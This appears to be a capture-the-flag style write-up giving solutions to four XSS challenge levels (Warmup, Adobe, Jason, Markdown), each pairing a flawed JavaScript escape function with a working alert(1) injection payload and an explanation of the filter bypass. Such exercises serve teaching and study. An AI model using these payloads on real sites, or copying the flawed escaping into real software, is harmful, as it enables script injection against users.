## Warmup
```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```
* solution:
  * ```");alert(1,"```
  

## Adobe
```
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
* solution:
  * ```\");alert(1)//```
  * use \ to escape the \ part of \" which the \ we added will escape the \ instead of the ".  

## Jason
```
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
* solution:
  * ```</script><script>alert(1)//```
  * output ```<script>console.log("</script><script>alert(1)//");</script>```
  * JSON.stringify() escapes double quotes to \" but it does not escape <>, terminate the ```<script>``` block and start a new one.

## Markdown
```
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```
* Solution:
  * Works on chrome
  * ```[[a|http://onerror=alert(1)//]]```
  * The first line encoded < and " 
  * The second line change any thing from ```http://S+``` to 
    * ``` <a href="http://S+">http://S+</a>``` S+ matches a empty string or more.
  * The third line changes ```[[a|b]]``` to 
    * ```<img alt="b" src="a.gif">```
  * Use ```//``` as white space, then ```"``` in front of http close out the alt. Then ```//``` comment out the ```"``` in the end.
  * Output ```<img alt="<a href="http://''onerror='alert(1)'//" src="x.gif">">http://''onerror='alert(1)'//]]</a>```
  * Iframe ```<a href=">http://''onerror='alert(1)'//]]```
